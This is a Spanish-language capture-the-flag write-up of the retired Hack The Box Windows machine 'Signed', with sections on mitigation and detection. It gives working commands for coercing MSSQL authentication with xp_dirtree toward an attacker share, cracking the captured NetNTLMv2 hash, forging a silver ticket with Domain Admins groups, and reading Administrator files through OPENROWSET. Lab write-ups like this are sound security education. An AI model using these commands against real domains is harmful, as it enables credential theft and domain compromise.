---
machine: Signed
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, mssql, ntlm, kerberos, silver-ticket, openrowset, godpotato, privesc]
---

# Signed — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Se parte de credenciales locales de MSSQL. `xp_dirtree` fuerza al servicio a autenticarse contra un share del atacante y el hash NetNTLMv2 de `mssqlsvc` se crackea. Con esa cuenta se forja un silver ticket incluyendo el RID de `mssqlsvc` y los grupos IT y Domain Admins, lo que da `sysadmin`; `OPENROWSET(BULK ...)` lee archivos como Administrator y el historial de PowerShell revela su contraseña. También hay rutas por relay NTLM y por recuperación del token con `SeImpersonatePrivilege`.

## Reconocimiento

```bash
nmap -Pn -sCV -p1433 <IP>
```

- Solo `1433` MSSQL Server 2022 en un DC.
- Credenciales iniciales de un usuario local de MSSQL.
- NTLM y Kerberos disponibles; el dominio es `SIGNED.HTB`.

## Enumeración

Con `mssqlclient.py` se comprueba que la cuenta no es `sysadmin` y que `xp_cmdshell` está deshabilitado. `xp_dirtree` sí funciona y permite enumerar el sistema. `--rid-brute` lista usuarios y grupos, incluido IT con RID 1105 y `mssqlsvc` con 1103.

## Foothold

Se ejecuta `xp_dirtree \\<ATTACKER>\share`; Responder captura el NetNTLMv2 de `mssqlsvc`, que se crackea con hashcat modo 5600. La contraseña funciona para autenticación Windows integrada en MSSQL.

```bash
# coerción y captura
SQL> xp_dirtree \\<ATTACKER>\share
hashcat -m 5600 mssqlsvc.hash rockyou.txt
# silver ticket
ticketer.py -nthash <HASH> -domain-sid <SID> -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' Administrator
KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
```

## Movimiento lateral

Con el hash NTLM de `mssqlsvc` se forja un silver ticket para `MSSQLSvc/DC01.signed.htb:1433` y se añaden el RID 1103 (`mssqlsvc`) y los grupos 1105 (IT) y 512 (Domain Admins). El ticket da `sysadmin`; `OPENROWSET(BULK ...)` lee archivos con los grupos del ticket, incluido el historial de PowerShell del Administrator.

## Escalada de privilegios

El historial contiene la contraseña con la que se reseteó Administrator. Como alternativa, se crea un registro DNS malicioso, se coacciona autenticación del DC y se relay a WinRM; o se recupera el token original de `mssqlsvc` con `SeImpersonatePrivilege` y se usa GodPotato. Cualquiera de las vías da Administrator.

## Evidencia

- `xp_dirtree` y hash de `mssqlsvc`.
- RID de servicio, grupos 512/1105 y silver ticket `sysadmin`.
- Lectura con `OPENROWSET` y historial de PowerShell.
- Rutas alternativas de relay y GodPotato.

## Lecciones aprendidas

- `xp_dirtree` es una primitiva de coerción de autenticación.
- Un silver ticket puede incluir grupos arbitrarios.
- `OPENROWSET(BULK)` lee archivos con el contexto del ticket.
- Los historiales de administración filtran contraseñas.

## Mitigación y detección

- Deshabilitar `xp_dirtree` y restringir la coerción SMB.
- Rotar contraseñas de servicio y usar gMSA.
- Firmar SMB y limitar NTLM.
- Auditar `sysadmin`, tickets Kerberos y `OPENROWSET`.

## Referencias

- [0xdf — Signed](https://0xdf.gitlab.io/2026/02/07/htb-signed.html)
- [IppSec — Signed](https://www.youtube.com/watch?v=d7FCnR6YS_E)
- [Hack The Box — Signed](https://app.hackthebox.com/machines/signed)
